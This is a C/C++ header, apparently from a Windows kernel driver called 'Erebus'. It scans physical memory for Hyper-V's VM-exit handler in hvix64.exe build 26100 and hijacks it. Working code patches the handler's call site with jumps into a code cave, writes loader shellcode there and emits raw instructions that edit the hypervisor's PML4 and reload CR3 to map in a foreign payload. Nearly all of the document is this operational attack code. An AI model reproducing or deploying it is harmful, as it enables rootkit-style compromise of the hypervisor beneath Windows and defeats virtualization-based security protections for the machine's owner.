#pragma once

#include "util.hpp"

typedef struct _VMEXIT_SIGNATURE {
    UINT32 Id;
    PUINT8 Pattern;
    const char* Mask;
    SIZE_T Length;
    UINT32 CallOffset;
} VMEXIT_SIGNATURE, *PVMEXIT_SIGNATURE;

static UINT8 INTEL_26100_VMEXIT_SIG[] = {
    0x66, 0x83, 0xFE, 0x01, 0x75, 0x0D, 0x48, 0x8B,
    0xD5, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0x4C, 0x24, 0x00, 0xFB, 0x8B, 0xD6, 0x0B, 0x54,
    0x24, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9
};

// hvix64.exe (build 26100):
//
//   003a856d: 66 83 FE 01       cmp    si, 1
//   003a8571: 75 0D             jne    +0x0D
//   003a8573: 48 8B D5          mov    rdx, rbp
//   003a8576: E8 xx xx xx xx    call   ...
//   003a857b: 48 8B 4C 24 xx    mov    rcx, [rsp+xx]
//   003a8580: FB                sti
//   003a8581: 8B D6             mov    edx, esi
//   003a8583: 0B 54 24 xx       or     edx, [rsp+xx]
//   003a8587: E8 xx xx xx xx    call   ...        <- hooked call site
//   003a858c: E9 xx xx xx xx    jmp    ...
//
// CallOffset = 0x1A is the offset of the hooked E8 inside the signature.

static VMEXIT_SIGNATURE VMEXIT_SIGNATURES[] = {
    { 26100, INTEL_26100_VMEXIT_SIG, "xxxxxxxxxx????xxxx?xxxxxx?x????x", sizeof(INTEL_26100_VMEXIT_SIG), 0x1A },
};

static constexpr UINT64 EREBUS_SELF_REF_PML4 = 0xFFFFFF7FBFDFE000ULL;
static constexpr UINT32 EREBUS_PAYLOAD_PML4_INDEX = 100;
static constexpr UINT32 EREBUS_PAYLOAD_PML4E_OFFSET =
    EREBUS_PAYLOAD_PML4_INDEX * sizeof(UINT64);
static constexpr SIZE_T EREBUS_REMAP_FINAL_CAVE_SIZE = 53;

static BOOLEAN ScanVmExitCallSite(IN PVOID page, OUT PVOID* callSiteOut, OUT UINT32* signatureIdOut)
{
    for (UINT32 index = 0; index < RTL_NUMBER_OF(VMEXIT_SIGNATURES); ++index) {
        PVOID patternHit = NULL;
        PVMEXIT_SIGNATURE signature = &VMEXIT_SIGNATURES[index];

        if (ScanPattern(page, signature->Pattern, signature->Mask, signature->Length, &patternHit)) {
            *callSiteOut = (PUINT8)patternHit + signature->CallOffset;
            *signatureIdOut = signature->Id;
            return TRUE;
        }
    }

    return FALSE;
}

static NTSTATUS WriteRelativeJump32(IN PUINT8 instruction, IN PUINT8 target)
{
    INT64 delta = (INT64)((UINT64)target - ((UINT64)instruction + 5));
    if (delta < -0x80000000LL || delta > 0x7fffffffLL) {
        return STATUS_INTEGER_OVERFLOW;
    }

    instruction[0] = 0xE9;
    *(INT32*)(instruction + 1) = (INT32)delta;
    return STATUS_SUCCESS;
}

// A processor can still return through the temporary loader trampoline after
// the final cave has been installed (stale instruction cache / late CPUID
// handling). The loader returns to `cave + loaderSize + 5`; keep a rel32 jump
// to afterCall there instead of leaving 0xCC, otherwise that return raises an
// INT3 inside the hypervisor.
static NTSTATUS WriteLoaderReturnCompatibilityTrampoline(
    IN PUINT8 cave,
    IN SIZE_T loaderSize,
    IN SIZE_T requiredCaveSize,
    IN PUINT8 afterCall,
    IN PUINT8 finalCodeEnd)
{
    PUINT8 trampoline = cave + loaderSize + 5;
    PUINT8 requiredEnd = cave + requiredCaveSize;

    if (trampoline < finalCodeEnd || trampoline + 5 > requiredEnd) {
        DbgMsg("loader return trampoline does not fit: trampoline=%p final_end=%p required_end=%p",
            trampoline,
            finalCodeEnd,
            requiredEnd);
        return STATUS_BUFFER_TOO_SMALL;
    }

    NTSTATUS status = WriteRelativeJump32(trampoline, afterCall);
    if (!NT_SUCCESS(status)) {
        DbgMsg("loader return trampoline rel32 out of range: trampoline=%p after=%p", trampoline, afterCall);
    }
    return status;
}

static NTSTATUS FindVmExitHookCave(
    IN PVOID pageBuffer,
    IN UINT64 exitHandlerAddress,
    OUT PUINT8* caveOut,
    OUT SIZE_T* cavePaddingSizeOut,
    OUT SIZE_T* requiredCaveSizeOut)
{
    PUINT8 pageBase = (PUINT8)pageBuffer;
    PUINT8 callInstr = (PUINT8)exitHandlerAddress;
    PUINT8 bufferEnd = pageBase + PAGE_SIZE;
    SIZE_T loaderSize = (SIZE_T)((UINT8*)LoaderASMEnd - (UINT8*)LoaderASM);
    const SIZE_T loaderPatchSize = loaderSize + 10;
    const SIZE_T finalCaveBudget = EREBUS_REMAP_FINAL_CAVE_SIZE;
    SIZE_T requiredCaveSize = loaderPatchSize > finalCaveBudget ? loaderPatchSize : finalCaveBudget;

    *caveOut = nullptr;
    *cavePaddingSizeOut = 0;
    *requiredCaveSizeOut = requiredCaveSize;

    if (callInstr < pageBase || callInstr + 5 > bufferEnd || loaderSize == 0 || loaderSize > 128) {
        DbgMsg("invalid hook cave inputs call=%p page=%p loaderSize=%llu", callInstr, pageBase, (UINT64)loaderSize);
        return STATUS_INVALID_PARAMETER;
    }

    PUINT8 bestCave = nullptr;
    SIZE_T bestCaveSize = 0;
    for (PUINT8 p = callInstr + 1; p + requiredCaveSize <= bufferEnd; ++p) {
        if (*p == 0xCC) {
            SIZE_T runSize = 0;
            while (p + runSize < bufferEnd && p[runSize] == 0xCC) {
                ++runSize;
            }
            if (runSize > bestCaveSize) {
                bestCave = p;
                bestCaveSize = runSize;
            }

            if (runSize >= requiredCaveSize) {
                *caveOut = p;
                *cavePaddingSizeOut = runSize;
                return STATUS_SUCCESS;
            }
        }
    }

    DbgMsg("failed to find a same-page code cave: best=%p best_size=%llu required=%llu",
        bestCave,
        (UINT64)bestCaveSize,
        (UINT64)requiredCaveSize);
    return STATUS_UNSUCCESSFUL;
}

NTSTATUS HijackVMExitHandler(PDISK disk, UINT64 exitHandlerAddress, PVOID pageBuffer, PVOID pageMapping, PHYSICAL_ADDRESS pdptPhysicalBase, UINT32 originalHookOffset, UINT32 callDispatcherOffset)
{
    PUINT8 pageBase = (PUINT8)pageBuffer;
    PUINT8 callInstr = (PUINT8)exitHandlerAddress;
    PUINT8 nearestCC = nullptr;
    INT32 originalCallRel = *(INT32*)(callInstr + 1);
    PUINT8 originalCallTarget = callInstr + 5 + originalCallRel;
    PUINT8 afterCall = callInstr + 5;
    SIZE_T loaderSize = (SIZE_T)((UINT8*)LoaderASMEnd - (UINT8*)LoaderASM);
    UINT8 loaderBytes[128] = { 0 };
    SIZE_T cavePaddingSize = 0;
    SIZE_T requiredCaveSize = 0;
    NTSTATUS status = FindVmExitHookCave(pageBuffer, exitHandlerAddress, &nearestCC, &cavePaddingSize, &requiredCaveSize);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    if (cavePaddingSize < requiredCaveSize) {
        DbgMsg("same-page code cave is too short: padding=%llu required=%llu",
            (UINT64)cavePaddingSize,
            (UINT64)requiredCaveSize);
        return STATUS_BUFFER_TOO_SMALL;
    }

    RtlCopyMemory(loaderBytes, (PVOID)LoaderASM, loaderSize);
    for (SIZE_T j = 0; j + sizeof(UINT64) <= loaderSize; j++) {
        UINT64* candidate = (UINT64*)(loaderBytes + j);
        if (*candidate == 0xCAFEBABEDEADBEEF) {
            *candidate = pdptPhysicalBase.QuadPart;
            break;
        }
    }
    for (SIZE_T j = 0; j + sizeof(UINT32) <= loaderSize; j++) {
        UINT32* candidate = (UINT32*)(loaderBytes + j);
        if (*candidate == 0xBABECAFE) {
            *candidate = (UINT32)((UINT64)originalCallTarget - (UINT64)pageBase);
        }
        if (*candidate == 0xDEADBEEF) {
            *candidate = originalHookOffset;
        }
    }
    RtlCopyMemory(nearestCC, loaderBytes, loaderSize);
    PUINT8 loaderEnd = nearestCC + loaderSize;
    loaderEnd[0] = 0xE8;
    *(INT32*)(loaderEnd + 1) = (INT32)(originalCallTarget - (loaderEnd + 5));
    loaderEnd[5] = 0xE9;
    *(INT32*)(loaderEnd + 6) = (INT32)((UINT64)afterCall - ((UINT64)loaderEnd + 10));

    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status)) {
        DbgMsg("loader cave DiskCopy failed: %08X", status);
        return status;
    }

    UINT8 originalCallInstruction[5];
    RtlCopyMemory(originalCallInstruction, callInstr, sizeof(originalCallInstruction));

    callInstr[0] = 0xE9;
    *(INT32*)(callInstr + 1) = (INT32)((UINT64)nearestCC - ((UINT64)callInstr + 5));

    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status)) {
        DbgMsg("loader hook DiskCopy failed: %08X", status);
        return status;
    }

    status = ExecuteCPUIDEachProcessor();
    if (!NT_SUCCESS(status)) {
        DbgMsg("ExecuteCPUIDEachProcessor failed: %08X", status);
        return status;
    }

    Sleep(1000);

    RtlCopyMemory(callInstr, originalCallInstruction, sizeof(originalCallInstruction));
    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status)) {
        DbgMsg("restore pre-final call DiskCopy failed: %08X", status);
        return status;
    }

    Sleep(1000);

    RtlFillMemory(nearestCC, requiredCaveSize, 0xCC);
    const UINT32 selectedCallDispatcherOffset = callDispatcherOffset;

    PUINT8 emit = nearestCC;
    auto emit8 = [&emit](UINT8 value) { *emit++ = value; };
    auto emit32 = [&emit](INT32 value) {
        *reinterpret_cast<INT32*>(emit) = value;
        emit += sizeof(INT32);
    };
    auto emit64 = [&emit](UINT64 value) {
        *reinterpret_cast<UINT64*>(emit) = value;
        emit += sizeof(UINT64);
    };

    emit8(0x50);              // push rax
    emit8(0x53);              // push rbx
    emit8(0x48);              // mov rbx, self-ref PML4 VA
    emit8(0xBB);
    emit64(EREBUS_SELF_REF_PML4);
    emit8(0x48);              // mov rax, payload PDPTE | present | write
    emit8(0xB8);
    emit64(pdptPhysicalBase.QuadPart | 3ULL);
    emit8(0x48);              // mov [rbx + PML4[100]], rax
    emit8(0x89);
    emit8(0x83);
    emit32(EREBUS_PAYLOAD_PML4E_OFFSET);
    emit8(0x0F);              // mov rbx, cr3
    emit8(0x20);
    emit8(0xDB);
    emit8(0x0F);              // mov cr3, rbx
    emit8(0x22);
    emit8(0xDB);
    emit8(0x5B);              // pop rbx
    emit8(0x58);              // pop rax
    emit8(0xFF);              // call qword ptr [rip+disp32]; return to the cave before jumping afterCall.
    emit8(0x15);
    PUINT8 callDispatcherDisp = emit;
    emit32(0);
    emit8(0xEB);
    emit8(0x00);
    PUINT8 jmpEptPayloadToAfterCall = emit - 1;
    PUINT8 callDispatcherSlot = emit;
    emit64(PAYLOAD_VIRTUAL_BASE + selectedCallDispatcherOffset);

    INT64 payloadAfterDelta = (INT64)(afterCall - (jmpEptPayloadToAfterCall + 1));
    if (payloadAfterDelta < -128 || payloadAfterDelta > 127) {
        DbgMsg("final cave rel8 out of range: payload_after=%lld", payloadAfterDelta);
        return STATUS_INTEGER_OVERFLOW;
    }
    *jmpEptPayloadToAfterCall = (UINT8)(INT8)payloadAfterDelta;

    INT64 callDispatcherDelta = (INT64)(callDispatcherSlot - (callDispatcherDisp + sizeof(INT32)));
    if (callDispatcherDelta < -0x80000000LL || callDispatcherDelta > 0x7fffffffLL) {
        DbgMsg("final cave dispatcher slot out of range: delta=%lld", callDispatcherDelta);
        return STATUS_INTEGER_OVERFLOW;
    }
    *(INT32*)callDispatcherDisp = (INT32)callDispatcherDelta;

    SIZE_T finalCaveSize = (SIZE_T)(emit - nearestCC);
    if (finalCaveSize > requiredCaveSize) {
        DbgMsg("final cave overflow: size=%llu budget=%llu", (UINT64)finalCaveSize, (UINT64)requiredCaveSize);
        return STATUS_BUFFER_OVERFLOW;
    }

    // The temporary loader returns through `cave + loaderSize + 5`. A CPU can
    // still be executing that loader path after this final cave is installed
    // (stale instruction bytes, or a CPUID VM exit handled slightly late).
    // Re-install the rel32 jump to afterCall at that exact offset so a late
    // loader return jumps away instead of executing the 0xCC padding and
    // raising an INT3 inside the hypervisor. This is install-safety, not
    // legacy-cave compatibility.
    status = WriteLoaderReturnCompatibilityTrampoline(
        nearestCC,
        loaderSize,
        requiredCaveSize,
        afterCall,
        emit);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status)) {
        DbgMsg("final cave DiskCopy failed: %08X", status);
        return status;
    }

    callInstr[0] = 0xE9;
    *(INT32*)(callInstr + 1) = (INT32)((UINT64)nearestCC - ((UINT64)callInstr + 5));
    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status)) {
        DbgMsg("final hook DiskCopy failed: %08X", status);
        return status;
    }

    // Diagnostic: verify the patched call site actually made it into the handler page.
    status = DiskCopy(disk, pageBuffer, pageMapping);
    if (!NT_SUCCESS(status)) {
        DbgMsg("hook verify DiskCopy failed: %08X", status);
        return status;
    }

    const INT32 expectedHookRel = (INT32)((UINT64)nearestCC - ((UINT64)callInstr + 5));
    if (callInstr[0] != 0xE9 || *(INT32*)(callInstr + 1) != expectedHookRel) {
        DbgMsg("hook verify mismatch: call=%p cave=%p byte=%02X rel=%08X expected=%08X",
            callInstr,
            nearestCC,
            callInstr[0],
            *(INT32*)(callInstr + 1),
            expectedHookRel);
        return STATUS_INVALID_PARAMETER;
    }

    return STATUS_SUCCESS;
}

NTSTATUS FindVMExitHandler(IN PDISK disk, OUT PEREBUS_PHYSICAL_MAPPING mappingOut, OUT PVOID *bufferOut, OUT UINT64 *exitHandlerAddressOut, OUT PPHYSICAL_MEMORY_RANGE *hyperVRange)
{
    PHYSICAL_ADDRESS highest;
    highest.QuadPart = MAXULONG32;

    PVOID buffer = MmAllocateContiguousMemory(PAGE_SIZE, highest);
    if (!buffer) {
        DbgMsg("Failed to allocate scan buffer");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    PVOID foundAddress = NULL;
    PVOID foundMapping = NULL;
    PHYSICAL_ADDRESS mzHeaderAddress{ };
    PPHYSICAL_MEMORY_RANGE ranges = MmGetPhysicalMemoryRanges();
    PHYSICAL_MEMORY_RANGE foundRange = { 0 };
    UINT32 matchedSignatureId = 0;
    UINT64 allOnesCandidates = 0;
    UINT64 mapFailures = 0;
    UINT64 bounceFailures = 0;
    UINT64 bouncedPages = 0;

    if (ranges) {
        PPHYSICAL_MEMORY_RANGE range = ranges;
        while (range->BaseAddress.QuadPart || range->NumberOfBytes.QuadPart) {
            if (foundAddress != NULL) {
                break;
            }

            UINT64 rangeStart = (UINT64)range->BaseAddress.QuadPart;
            UINT64 rangeEnd = rangeStart + (UINT64)range->NumberOfBytes.QuadPart;
            UINT64 scanStart = rangeStart;
            if (rangeEnd <= EREBUS_HYPERV_SCAN_FLOOR) {
                ++range;
                continue;
            }
            if (scanStart < EREBUS_HYPERV_SCAN_FLOOR) {
                scanStart = EREBUS_HYPERV_SCAN_FLOOR;
            }

            for (UINT64 physicalAddress = scanStart; physicalAddress < rangeEnd; physicalAddress += PAGE_SIZE) {
                UINT64 pfn = physicalAddress >> PAGE_SHIFT;
                EREBUS_PHYSICAL_MAPPING mapping = { };

                MM_COPY_ADDRESS src;
                src.PhysicalAddress.QuadPart = pfn << PAGE_SHIFT;

                SIZE_T outSize;
                if (!NT_SUCCESS(MmCopyMemory(buffer, src, PAGE_SIZE, MM_COPY_MEMORY_PHYSICAL, &outSize)) ||
                    outSize != PAGE_SIZE) {
                    continue;
                }

                if (!IsPageAllOnes(buffer)) {
                    continue;
                }
                ++allOnesCandidates;

                if (!NT_SUCCESS(MapPhysicalRangeForBounce(src.PhysicalAddress, PAGE_SIZE, &mapping))) {
                    ++mapFailures;
                    continue;
                }

                if (!NT_SUCCESS(DiskCopy(disk, buffer, mapping.VirtualAddress))) {
                    ++bounceFailures;
                    UnmapPhysicalBounceMapping(&mapping);
                    continue;
                }
                ++bouncedPages;

                if (ScanVmExitCallSite(buffer, &foundAddress, &matchedSignatureId)) {
                    foundMapping = mapping.VirtualAddress;
                    mzHeaderAddress = src.PhysicalAddress;
                    foundRange = *range;
                    *mappingOut = mapping;
                    break;
                }

                UnmapPhysicalBounceMapping(&mapping);
            }
            ++range;
        }
        ExFreePool(ranges);
    }
    else {
        DbgMsg("Failed to get physical memory ranges");
    }

    if (foundAddress == NULL || foundMapping == NULL) {
        MmFreeContiguousMemory(buffer);
        DbgMsg("Failed to find Hyper-V VMEXIT handler candidates=%llu map_fail=%llu bounce_fail=%llu bounced=%llu",
            allOnesCandidates,
            mapFailures,
            bounceFailures,
            bouncedPages);
        return STATUS_UNSUCCESSFUL;
    }

    PPHYSICAL_MEMORY_RANGE rangeCopy = (PPHYSICAL_MEMORY_RANGE)ExAllocatePool(NonPagedPoolNx, sizeof(PHYSICAL_MEMORY_RANGE));
    if (!rangeCopy) {
        UnmapPhysicalBounceMapping(mappingOut);
        MmFreeContiguousMemory(buffer);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    *rangeCopy = foundRange;
    *bufferOut = buffer;
    *exitHandlerAddressOut = (UINT64)foundAddress;
    *hyperVRange = rangeCopy;

    DbgMsg("matched VMEXIT call site sig=%lu page_pa=%p call_off=%llx call=%p",
        matchedSignatureId,
        mzHeaderAddress.QuadPart,
        (UINT64)((PUINT8)foundAddress - (PUINT8)buffer),
        foundAddress);

    return STATUS_SUCCESS;
}

BOOLEAN IsHyperVRunning(VOID) {
    INT32 info[4] = { 0 };
    __cpuid(info, EREBUS_CPUID_HV_VENDOR_LEAF);
    return info[1] == 'rciM' && info[2] == 'foso' && info[3] == 'vH t';
}
